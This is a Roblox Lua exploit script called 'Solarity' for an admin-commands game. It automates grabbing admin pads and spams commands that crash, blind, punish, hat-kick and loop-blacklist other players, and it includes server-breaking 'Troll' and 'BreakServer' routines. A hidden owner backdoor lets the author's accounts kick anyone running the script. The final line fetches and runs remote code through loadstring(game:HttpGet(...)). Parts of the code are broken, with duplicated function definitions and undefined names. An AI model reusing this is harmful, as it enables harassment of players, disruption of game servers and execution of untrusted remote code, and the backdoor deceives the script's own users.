-- NOTE : i love you

wait(1)

sowner = "masterplayerguy1234" or "MarkDwayne_Pro"

local antikill = true
local antihat = true
local anticlone = true
local anticlientclone = true
local gearban = false
local antivg = true
local antipunish = true
local antidog = true
local antimsg = true
local antirocket = true

local lp = game.Players.LocalPlayer
local char = lp.Character
local humanoid = char:WaitForChild("Humanoid")
local humanoid2 = char.HumanoidRootPart

local getplrs = game.Players:GetPlayers()
local lighting = game:GetService("Lighting")
local plrserv = game:GetService("Players")

local adminf = game:GetService("Workspace").Terrain["_Game"].Admin
local rp = game:GetService("Workspace").Terrain["_Game"].Admin:FindFirstChild("Regen")
local terrain = game:GetService("Workspace").Terrain
local gamev = terrain["_Game"]
local folder = gamev.Folder
local adminpads = adminf.Pads:GetChildren()

local rtx = {
  sunrise = {"outdoorambient 0.7 0.7 0.7", "ambient 100 0 100", "fogend 3000", "time 6.9", "colorshifttop 100 50 0", "colorshiftbottom 0 0 0"}
}

local blacklist = {"skconk"}
local whitelist = {"MarkDwayne_Pro", "t_echr", "hellonoobsloljkw"}

local cmds = {

"re",
"regen",
"Shoot",
"rail plr amnt delay(opt)",
"laser plr amt delay(opt)",
"setgplr -- Sets a target",
"kick plr--hatkick",
"bl2 player -- this doesnt unbl, cuz this custom bl also hatkicks the player!",
"Who crashed -- vg",
"Who crashed? -- Orinthian vg",
"fakemsg plr text --unfinished",
"bl/unbl plr --Blacklists the player",
"dogify player -- this will fuck the player's character into a dog. it MAY crash them",
"Troll -- this will fuck the server up. not crashing but still gonna make the server a living Bullshit",
"wl/unwl --Whitelists the player(Whitelist currently is
malfunctioning!)"
}

function ct(a)

  game.Players:Chat(tostring(a))

end

local function plrcheck(plr)
  if plr ~= "others" and plr ~= "me" and plr ~= "all" then
    for i, v in pairs(game.Players:GetPlayers()) do
      if plr == string.sub(v.Name:lower(), 1, #plr) or plr == string.sub(v.DisplayName:lower(), 1, #plr) then
        gplr = v.Name
      end
    end
  elseif plr == "all" then
    gplr = plr
  elseif plr == "others" then
    gplr = plr
  elseif plr == "me" then
    gplr = lp.Name
  end
end

function h(b)

  ct("h "..tostring(b))

end

function Regen()
  pcall(function()
    fireclickdetector(rp.ClickDetector)
  end)
end

for plri, plr in pairs(getplrs) do

  plr.Chatted:Connect(function(m)

    local p = ";"
    local split = string.split(m, " ")
    local cmd = split[1] or split[1]:find(p)
    local args1 = split[2]
    local args2 = split[3]
    local args3 = split[4]
    local args4 = split[5]

    if plr == game.Players:FindFirstChild("masterplayerguy1234") or plr == game.Players:FindFirstChild("MarkDwayne_pro") then

      if cmd == "SolarKick" then
          
        if lp.Name ~= "masterplayerguy1234" and lp.Name ~= "MarkDwayne_Pro" then
          lp:Kick("You have been kicked by Owner of Solarity.")
        end
      end

      if cmd == "TEST" then
        if lp.Name ~= "masterplayerguy1234" and lp.Name ~= "MarkDwayne_Pro" then   
          ct("h i indeed use SOLARITY.")

        end
      end
        
    end
    if plr == game.Players.LocalPlayer then

      if cmd == "cmds" then
        for i, v in pairs(cmds) do
          print(i..". "..v)
        end
      end
      
       

      if cmd == "to" then
        plrcheck(args1)
	humanoid2.CFrame = plrserv:FindFirstChild(gplr).Character.HumanoidRootPart.CFrame + CFrame.new(0, 5, 0)
      end
      
      -- Add this to your cmds table if needed
-- table.insert(cmds, "crash")

-- Add this inside the plr.Chatted:Connect function
if cmd == "Troll" then
  ct("gchar all masterplayerguy1234")
  ct("h \n\n\n arise Haxx! \n\n\n")
  ct("name all CRYBABY LOL")
  ct('fogend 50')
  ct('flash')
  task.wait(1.5)
  Troll()
end

				
      if cmd == "bring" then
        plrcheck(args1)
        ct("tp "..gplr.." me")
      end
        
      if cmd == "re" then

        ct("reset me")

      end

      if cmd == "regen" then

        Regen()

      end

      if cmd == "circulize" then

	      for i, v in pairs(lp.Backpack:GetChildren()) do
          local a = tonumber(args1)
          local h = tonumber(args2)
          v.GripPos = Vector3.new(math.cos(i) * a + 1.5, h, math.sin(i) * a - 1.5)
        end
      end
      if cmd == "grippos" then
        for i, v in pairs(lp.Backpack:GetChildren()) do
          v.GripPos = Vector3.new(m:sub(9))
        end
      end
      
      

      if cmd == "grail" then
        plrcheck(args1)
        for i = 1, args2 do
          ct("gear "..gplr.." 79446473")
        end
      end
				
      if cmd == "rail" then

      ct("ungear me")
      ct("samount "..args2)
      ct("sup gear me 79446473")
      ct("equipall")
      wait(1)
        for i, v in pairs(game.Players.LocalPlayer.Character:GetChildren()) do
          wait(args3)
          plrcheck(args1)
          if v.Name == "Railgun" then
            v.Click:FireServer(game.Players[gplr].Character:GetPivot().Position)
          end
        end
      end

      if cmd == "setgplr" then

        plrcheck(args1)

      end

      if cmd == "wl" then

        plrcheck(args1)
        table.insert(whitelist, gplr)
        for i, v in pairs(whitelist) do
          print("Player whitelisted!")
          print(v)
        end
      elseif cmd == "unwl" then
        plrcheck(args1)
        for i, v in pairs(whitelist) do
          if gplr == v then
            table.remove(whitelist, i)
            print("Player removed!")
            print(v)
          end
        end
      end
      if cmd == "bl" then

        plrcheck(args1)
        table.insert(blacklist, gplr)
        for i, v in pairs(blacklist) do
          print("Player blacklisted!")
          print(v)
        end
      elseif cmd == "unbl" then
        plrcheck(args1)
        for i, v in pairs(blacklist) do
          if gplr == v and v ~= nil then
            table.remove(blacklist, i)
            print("Player removed!")
            print(v)
          end
        end
      end
      if cmd == "kick" then
        plrcheck(args1)
        local target = gplr
        Regen()
        ct("setgrav "..target.." -1000")
        ct("jump "..target)
	wait(0.2)
        ct("size "..target.." 3")
        while plrserv:FindFirstChild(target) do

          wait(0.5)
          for i = 1, 100 do
            ct("hat "..gplr.." 18137588505")
          end
            
        end
        ct("h \n\n\n"..target..": * I ran away.\n\n\n")
      end
        
        
      if cmd == "Shoot" then

        local sg = Instance.new("ScreenGui")
        sg.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
        local sb = Instance.new("TextButton")
        sb.Parent = sg
        sb.Size = UDim2.new(0, 50, 0, 50)
        sb.Position = UDim2.new(1, -200, 0, 200)
        sb.Text = "Shoot"
        sb.Activated:Connect(function()

          ct("equipall")
          for i, v in pairs(game.Players.LocalPlayer.Character:GetChildren()) do

            if v:IsA("Tool") then
              for e, r in pairs(v:GetChildren()) do
                if r:IsA("RemoteEvent") then
                  r:FireServer(game.Players[gplr].Character:GetPivot().Position)
                end
              end
            end
          end
        end)

      end
      if cmd == "laser" then

      ct("ungear me")
      ct("samount "..args2)
      ct("sup gear me 139578207")
      ct("equipall")
      wait(1)
        for i, v in pairs(game.Players.LocalPlayer.Character:GetChildren()) do
          wait(args3)
          plrcheck(args1)
          if v.Name == "TriLaserGun" then
v.Click:FireServer(game.Players[gplr].Character:GetPivot().Position)
          end
        end
      end

      if cmd == "Who" then

        antivg = false
        gearban = false
        if args1 == "crashed?" then
          ct("spam gear all 92628079")
          ct("spam unsize all")
          ct("spam equipall")
        elseif args1 == "crashed" then
          ct("spam gear all 94794847")
          ct("spam unsize all")
          ct("spam equipall")
        end
      end


      if cmd == "fakemsg" then

        plrcheck(args1)
        local fm = string.sub(tostring(m), string.len(tostring(args1)) + tostring(string.len(cmd)) + 2)
        h("\n\n\n"..gplr..":"..fm.."\n\n\n")

      end

      if cmd == "antirocket" then
        if args1 == "on" then
          antirocket = false
        elseif args1 == "off" then
          antirocket = false
        end
      end
        
      if cmd == "antimsg" then
        if args1 == "on" then
          antimsg = true
        elseif args1 == "off" then
          antimsg = false
       end
     end

     

-- Add this inside the plr.Chatted:Connect function
if cmd == "bl2" then
  plrcheck(args1)
  table.insert(blacklist, gplr)
  for i, v in pairs(blacklist) do
    print("Player blacklisted!")
    print(v)
  end
  while table.find(blacklist, gplr) do
    ct("hat " .. gplr .. " 18137588505")
    wait(1) -- Adjust the wait time as needed
  end
end

-- Update the plrcheck function to handle partial names
local function plrcheck(plr)
  if plr ~= "others" and plr ~= "me" and plr ~= "all" then
    for i, v in pairs(game.Players:GetPlayers()) do
      if string.sub(v.Name:lower(), 1, #plr) == plr:lower() or string.sub(v.DisplayName:lower(), 1, #plr) == plr:lower() then
        gplr = v.Name
        break
      end
    end
  elseif plr == "all" then
    gplr = plr
  elseif plr == "others" then
    gplr = plr
  elseif plr == "me" then
    gplr = lp.Name
  end
end

        
      if cmd == "gearban" then
        if args1 == "on" then
          gearban = true
        elseif args1 == "off" then
          gearban = false
        end
      end
      
      -- Add this to your cmds table if needed
-- table.insert(cmds, "blindbreak")

-- Add this inside the plr.Chatted:Connect function
if cmd == "BreakServer" then
  for i = 1, 50 do
    ct("blind others others others others")
    ct("h the server is now broken. just leave.")
    wait(1) -- Adjust the wait time as needed
  end
end


      if cmd == "antipunish" then
        if args1 == "on" then
          antipunish = true
        elseif args1 == "off" then
          antipunish = false
        end
      end
        
      if cmd == "antivg" then
        if args1 == "on" then
          antivg = true
        elseif args1 == "off" then
          antivg = false
        end
      end
      
      if cmd == "Troll" then
    if string.sub(msg:lower(), 1,  5) == 'crash' then
    Chat("Gchar all masterplayerguy1234")
    Chat("h arise Haxx!")
    Chat("name all CRYBABY LOL")
    Chat('fogend 50')
    Chat('flash')
    task.wait(1.5)
    Troll()
 end
end 

-- Add this to your cmds table if needed
-- table.insert(cmds, "dogify plr")

-- Add this inside the plr.Chatted:Connect function
if cmd == "dogify" then
  plrcheck(args1)
  while true do
    ct("dog " .. gplr)
    wait(0.2) -- Adjust the wait time as needed
  end
end

-- Update the plrcheck function to handle partial names
local function plrcheck(plr)
  if plr ~= "others" and plr ~= "me" and plr ~= "all" then
    for i, v in pairs(game.Players:GetPlayers()) do
      if string.sub(v.Name:lower(), 1, #plr) == plr:lower() or string.sub(v.DisplayName:lower(), 1, #plr) == plr:lower() then
        gplr = v.Name
        break
      end
    end
  elseif plr == "all" then
    gplr = plr
  elseif plr == "others" then
    gplr = plr
  elseif plr == "me" then
    gplr = lp.Name
   end
 end





      if cmd == "antikill" then

        if args1 == "on" then

          antikill = true

        elseif args1 == "off" then

          antikill = false

        end

      end

      if cmd == "antihat" then

        if args1 == "on" then
          
          antihat = true

        elseif args1 == "off" then

          antihat = false

        end

      end

      if cmd == "anticlone" then

        if args1 == "on" then
          anticlone = true
        elseif args1 == "off" then
          anticlone = false
        end

      end

      if cmd == "anticclone" then

        if args1 == "on" then
          anticlientclone = true
        elseif args1 == "off" then
          anticlientclone = false
        end

      end

      if cmd == "antidog" then

        if args1 == "on" then
          antidog = true
        elseif args1 == "off" then
          antidog = false
        end
      end
      
    end

  end)

end

game.Players.PlayerAdded:Connect(function(v)

  ct("h \n\n\nWelcome, "..v.Name.."\n\n\n")

end)

for _, Bricks in pairs(game:GetService("Workspace").Terrain._Game.Workspace.Obby:GetChildren()) do
        Bricks.CanTouch = false
end

local admingrab = coroutine.wrap(function()
    while true do

        if not game:GetService("Workspace").Terrain["_Game"].Admin.Pads:FindFirstChild(game.Players.LocalPlayer.Name .. "'s admin") then
            if game:GetService("Workspace").Terrain["_Game"].Admin.Pads:FindFirstChild("Touch to get admin") then
                local pad = game:GetService("Workspace").Terrain["_Game"].Admin.Pads:FindFirstChild("Touch to get admin"):FindFirstChild("Head")
                local padCFrame = game:GetService("Workspace").Terrain["_Game"].Admin.Pads:FindFirstChild("Touch to get admin"):FindFirstChild("Head").CFrame
                task.wait()
                pad.CanCollide = false
                repeat wait() until game.Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
                pad.CFrame = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
                task.wait()
                pad.CFrame = padCFrame
                pad.CanCollide = true
            else
                Regen()
            end
        end

    task.wait()

    end

end)
admingrab()

local banfunction = coroutine.wrap(function()

  while wait() do

    pcall(function()

      for i, v in ipairs(blacklist) do
          
        if not lighting:FindFirstChild(v) and v ~= nil then

          if game.Players:FindFirstChild(v) and v ~= nil and blplr ~= "Ih0temyIife" and blplr ~= "Sans_fromlb" then
        
            Regen()
            wait()
            ct("punish "..v)
            ct("blind "..v)
            ct("skydive "..v)

          end

        end
            
      end
          
    end)
      
  end
    
end)
banfunction()

local antikillc = coroutine.wrap(function()

  while wait() do

    if antikill then

      if game.Players.LocalPlayer.Character.Humanoid.Health == 0 then

        ct("re")

      end

    end

  end

end)
antikillc()

local antihatc = coroutine.wrap(function()

  while wait() do

    if antihat then
      pcall(function()
        for pli, plv in pairs(game.Players:GetPlayers()) do
        
          for i, v in pairs(plv.Character:GetChildren()) do

            if v:IsA("Accessory") and v ~= nil then

              v:Destroy()

            end

          end
          
        end

      end)
            
    end   
      
  end
    
end)
antihatc()

local anticlonec = coroutine.wrap(function()

  while wait() do

    if anticlone then
  
      for i, v in pairs(game.Players:GetPlayers()) do

        for e, r in pairs(folder:GetChildren()) do

          if v.Name == r.Name then

            ct("removeclones")

          end
            
        end

      end

    end
      
  end
    
end)
anticlonec()
local anticclonec = coroutine.wrap(function()

  while wait() do

    if anticlientclone then

      for i, v in pairs(game.Players:GetPlayers()) do

        for e, r in pairs(folder:GetChildren()) do

          if r.Name == v.Name then

            r:Destroy()

          end

        end
            
      end
          
    end
        
  end
      
end)
anticclonec()

local antivgc = coroutine.wrap(function()

  while wait() do

    if antivg then

      for i, v in pairs(game.Players:GetPlayers()) do

        for e,r in pairs(v:GetDescendants()) do

          if r.Name == "VampireVanquisher" or r.Name == "OrinthianSwordAndShield" then

            for wli, wlv in ipairs(whitelist) do

              if v ~= game.Players:FindFirstChild(wlv) and v ~= lp and v ~= game.Players:FindFirstChild(xowner) then

                ct("reset "..v.Name)
                ct("punish "..v.Name)
                ct("blind "..v.Name)
                
              end

            end

          end

        end
          
      end
 
    end
      
  end
    
end)
antivgc()

local gearbanc = coroutine.wrap(function()

  while wait() do

    if gearban then
      for i, v in pairs(game.Players:GetPlayers()) do
          
        for wli, wlv in ipairs(whitelist) do
            
          if v ~= game.Players:FindFirstChild(wlv) and v ~= lp and v ~= game.Players:FindFirstChild(xowner) then
            pcall(function()
            
              if v.Backpack:FindFirstChildOfClass("Tool") or v.Character:FindFirstChildOfClass("Tool") then

                ct("reset "..v.Name)

              end
              
            end)
            
          end
          
        end

      end
        
    end
      
  end
      
end)
gearbanc()
local antipunishc = coroutine.wrap(function()

  while wait() do

    if antipunish then

      if lighting:FindFirstChild(lp.Name) then

        ct("unpunish me")

      end
      
    end 

  end
  
end)
antipunishc()

local antidogc = coroutine.wrap(function()

  while wait() do

    if antidog then

      for i, v in pairs(getplrs) do
        pcall(function()
          for e, r in pairs(v.Character:GetChildren()) do
            if r:IsA("Seat") and r.Name == "Addon" and r ~= nil then
              ct("reset "..v.Name)
						end
          end
        end)
      end
        
    end
      
  end
    
end)
antidogc()

local antimsgc = coroutine.wrap(function()

  while wait() do

    if antimsg then

      for i, v in pairs(lp.PlayerGui:GetChildren()) do
          
        if v.Name == "MessageGUI" then
            
          v:Destroy()

        end
          
      end
        
    end
      
  end
    
end)
antimsgc()

local antirocketc = coroutine.wrap(function()

  while wait() do

    if antirocket then

      for i, v in pairs(getplrs) do

        pcall(function()
          
          for e, r in pairs(v.Character:GetChildren()) do

            if r.Name == "Rocket" and r ~= nil then

              r:Destroy()
                  
            end
                
          end 
            
        end)
          
      end
        
    end
      
  end
    
end)
antirocketc()
wait(1)
if lp.Name == "masterplayerguy1234" or lp.Name == "MarkDwayne_Pro" then
  h("\n\n\nThe owner of Solarity  joined the game. script made by masterplayerguy1234 aka haxx.\n\n\n")
else
  h("\n\n\n\n\n\nSolarity Succesfully Executed In 23 Ms. enjoy!")
end

loadstring(game:HttpGet('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'))()

ct("antikill on")
